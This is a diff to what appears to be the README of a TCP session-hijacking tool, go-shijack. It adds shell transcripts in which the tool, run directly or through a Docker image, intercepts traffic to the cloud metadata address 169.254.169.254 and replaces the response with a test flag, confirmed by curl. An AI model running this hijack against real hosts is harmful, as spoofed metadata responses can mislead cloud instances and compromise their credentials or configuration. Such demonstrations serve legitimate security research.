@@ -26,8 +26,19 @@ Content-Length: 11
 
 flag{test}
 EOF
+```
+
+```
 root@ecs-c5a4:~# ./go-shijack -t eth0 -i 169.254.169.254 -p 80 -f flag &
 [1] 362712
+root@ecs-c5a4:~# curl http://169.254.169.254
+flag{test}
+```
+
+or
+
+```
+root@ecs-c5a4:~# docker run -d --net=host -ti --rm -v $(pwd):/data ssst0n3/go-shijack:v0.1 -t eth0 -i 169.254.169.254 -p 80 -f /data/flag -k
 root@ecs-c5a4:~# curl http://169.254.169.254
 flag{test}
 ```
